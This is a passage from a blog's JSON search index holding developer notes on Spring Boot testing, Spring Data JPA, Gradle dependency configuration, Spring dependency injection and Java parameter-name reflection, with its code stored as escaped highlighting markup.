class=&quot;na&quot;&gt;mockMvc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;perform&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/cars/{name}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;andExpect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isNotFound&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } service @RunWith(MockitoJUnitRunner.class) public class CarServiceTest { &lt;span class=&quot;nd&quot;&gt;@Mock&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarRepository&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarService&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Before&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setUp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;carService&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Test&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getCarDetails_returnsCarInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;given&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;willReturn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hybrid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCarDetails&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;assertThat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEqualTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;assertThat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEqualTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hybrid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expected&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getCarDetails_whenCarNotFound&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;given&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;willReturn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;carService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCarDetails&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } Repository @RunWith(SpringRunner.class) @DataJpaTest public class CarRepositoryTests { &lt;span class=&quot;nd&quot;&gt;@Autowired&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarRepository&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Autowired&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TestEntityManager&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;testEntityManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Test&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;findByName_ReturnsCar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;savedCar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;testEntityManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;persistFlushFind&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hybrid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;assertThat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEqualTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedCar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;assertThat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEqualTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedCar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } cache @RunWith(SpringRunner.class) @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.NONE) @AutoConfigureTestDatabase public class CachingTest { &lt;span class=&quot;nd&quot;&gt;@Autowired&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarService&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@MockBean&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarRepository&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Test&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getCar_ReturnsCachedValue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;given&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anyString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;willReturn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hybrid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCarDetails&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCarDetails&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;prius&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } @Service public class CarService { &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CarRepository&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CarService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CarRepository&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;carRepository&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Cacheable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cars&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getCarDetails&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;Car&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carRepository&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CarNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;car&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } ",
      "url"      : "http://localhost:4000/2018/08/17/spring-boot-test/"
    } ,
  
    {
      "title"    : "spring JPA笔记",
      "category" : "JPA",
      "content": "Spring data JPA 笔记 JPA开发笔记 属性注解和ManyToOne关系注解冲突 下面代码中的studentId和student会冲突，造成应用不能启动  private Long studentId;  private Student student; &lt;span class=&quot;nd&quot;&gt;@ManyToOne&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cascade&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CascadeType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@JoinColumn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;student_id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;referencedColumnName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Student&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getStudent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;student&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 怎么启用Audit自动更新updatedAt @SpringBootApplication @EnableJpaAuditing // 这里，启用审计 class Application { ...... } @Entity @EntityListeners(AuditingEntityListener.class) public class SomeEntity {  @Id  private long id;  @CreatedDate // 创建的时间  private Date createTime;  @LastModifiedDate // 最后修改的时间  private Date updateTime;  ...... } findBy查询字段解析规则 框架在进行方法名解析时，会先把方法名多余的前缀截取掉，比如find、findBy、read、readBy、get、getBy，然后对剩下部分进行解析。并且如果方法的最后一个参数是Sort或者Pageable类型，也会提取相关的信息，以便按规则进行排序或者分页查询。 在创建查询时，我们通过在方法名中使用属性名称来表达，比如findByUserAddressZip()。框架在解析该方法时，首先剔除findBy，然后对剩下的属性进行解析，详细规则如下（此处假设该方法针对的域对象为 AccountInfo 类型）： 先判断 userAddressZip （根据POJO规范，首字母变为小写，下同）是否为AccountInfo的一个属性，如果是，则表示根据该属性进行查询；如果没有该属性，继续第二步； 从右往左截取第一个大写字母开头的字符串（此处为Zip），然后检查剩下的字符串是否为AccountInfo的一个属性，如果是，则表示根据该属性进行查询；如果没有该属性，则重复第二步，继续从右往左截取；最后假设 user 为 AccountInfo 的一个属性； 接着处理剩下部分（ AddressZip），先判断user所对应的类型是否有addressZip属性，如果有，则表示该方法最终是根据 &quot;AccountInfo.user.addressZip&quot; 的取值进行查询；否则继续按照步骤 2 的规则从右往左截取，最终表示根据 &quot;AccountInfo.user.address.zip&quot; 的值进行查询。 可能会存在一种特殊情况，比如 AccountInfo 包含一个 user 的属性，也有一个 userAddress 属性，此时会存在混淆。读者可以明确在属性之间加上 &quot;_&quot; 以显式表达意图，比如 &quot;findByUser_AddressZip()&quot; 或者 &quot;findByUserAddress_Zip()&quot;。 ",
      "url"      : "http://localhost:4000/2018/08/17/spring-jpa/"
    } ,
  
    {
      "title"    : "gradle笔记",
      "category" : "gradle",
      "content": "gradle学习笔记 引用 configurations configurations 是依赖的集合。比如compile configuration对应的是声明的compile dependency集合引用。 configurations { compile runtime testCompile.extendsFrom('compile') testRuntime.extendsFrom('runtime', 'testCompile') default.extendsFrom('runtime') } moudle depenency moudle就是我们声明的依赖。包括：group, name, and version。声明方式有： dependencies { compile 'org.apache.solr:solr-core:1.4.1' compile 'org.springframework:spring-core:3.0.5' testCompile 'junit:junit:4.8' } dependencies { compile group: 'org.apache.solr', name: 'solr-core' version: '1.4.1' compile group: 'org.springframework', name: 'spring-core', version: '3.0.5' testCompile group: 'junit', name: 'junit', version: '4.8' } // Fetching Spring Core 3.0.6 without any of its dependencies dependencies { compile('org.springframework:spring-core:3.0.6') {  transitive = false } } // Forcing Spring Core 3.0.6 to dominate any other versions of Spring Core in the dependency graph dependencies { compile('org.springframework:spring-core:3.0.6.RELEASE') {  force = true } } Avoiding commons-logging as a transitive dependency of Spring Core dependencies { compile('org.springframework:spring-core:3.0.6.RELEASE') {  exclude name: 'commons-logging' } } File dependency // Declaring a dependency explicitly on a locally managed module dependencies { compile files('lib/hacked-vendor-module.jar') } // Depending recursively on all of the files under lib dependencies { compile fileTree('lib') } // Declaring dependencies on subprojects dependencies { compile project(':codec') compile project(':content') } Maven Repositories In some cases, we might want to obtain POMs from one website (say, a centralized corporate repo), but download build artifacts from a mirrored copy of the repo somewhere else in the network.主要目的是节省带宽，提高下载速度。 // Setting the artifact URL as distinct from the default POM URL repositories { // Overriding artifacts for an internal repo maven {  url = 'http://central.megacorp.com/main/repo'  artifactUrls = [ 'http://dept.megacorp.com/local/repo' ] } // Obtain Maven Central artifacts locally mavenCentral artifactUrls: ['http://dept.megacorp.com/maven/central'] } 配置 Resolution Strategy // Failing the build when a dependency version conflict is detected configurations.all { resolutionStrategy {  failOnVersionConflict() } } // Forcing a particular version of a given dependency configurations.all { resolutionStrategy {  force 'commons-collections:commons-collections:2.1' } } Changing modules Changing modules 比如 SNAPSHOT module，gradle默认cahche24小时后更新。 configurations.all { resolutionStrategy {  cacheDynamicVersionsFor 1, 'hour'  cacheChangingModulesFor 0, 'seconds' } } ",
      "url"      : "http://localhost:4000/2018/08/18/gradle/"
    } ,
  
    {
      "title"    : "spring依赖注入方式选择",
      "category" : "spring DI",
      "content": "Spring依赖注入方式有Setter注入，构造函数注入。项目中如何选择？ 先说结论：推荐用构造函数注入并在注入时判空；依赖服务是optional或者比较多时部分依赖可以考虑用setter（生命周期比被依赖服务短的） setter依赖注入 早期Srping推荐用setter注入方式，spring参考例子中也大量使用。缺点是可能用到依赖服务时还未setter注入或者注入了空对象。解决空对象的一种方式是加入Spring 2.0 annotation @Required public class Service { private Collaborator collaborator; @Required public void setCollaborator(Collaborator c) { this.collaborator = c; } } 或者 public class Service implements InitializingBean { private Collaborator collaborator; public void setCollaborator(Collaborator c) { this.collaborator = c; } // from the InitializingBean interface public void afterPropertiesSet() { if (collaborator == null) { throw new IllegalStateException(&quot;Collaborator must be set in order for service to work&quot;); } } } 用setter注入的另外一个原因是构造函数注入不能直观指定依赖名字。 &lt;bean id=authenticator class=com.mycompany.service.AuthenticatorImpl/&gt; &lt;bean id=&quot;accountService&quot; class=&quot;com.mycompany.service.AccountService&quot;&gt; &lt;property name=&quot;authenticator&quot; ref=&quot;authenticator&quot;/&gt; &lt;/bean&gt; &lt;bean id=authenticator class=com.mycompany.service.AuthenticatorImpl/&gt; &lt;bean id=&quot;accountService&quot; class=&quot;com.mycompany.service.AccountService&quot;&gt; &lt;constructor-arg ref=&quot;authenticator&quot;/&gt; &lt;/bean&gt; 构造函数依赖注入 public Service(Collaborator collaborator) { if (collaborator == null) {  throw new IllegalArgumentException(Collaborator cannot be null); } this.collaborator = collaborator; } ",
      "url"      : "http://localhost:4000/2018/08/22/spring-DI/"
    } ,
  
    {
      "title"    : "Java 参数名自动发现",
      "category" : "java",
      "content": "如何动态获取java参数名 java 8 Java 8中可以在编译时添加参数javac -parameters，再通过reflection获取 public class Boundary { &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span 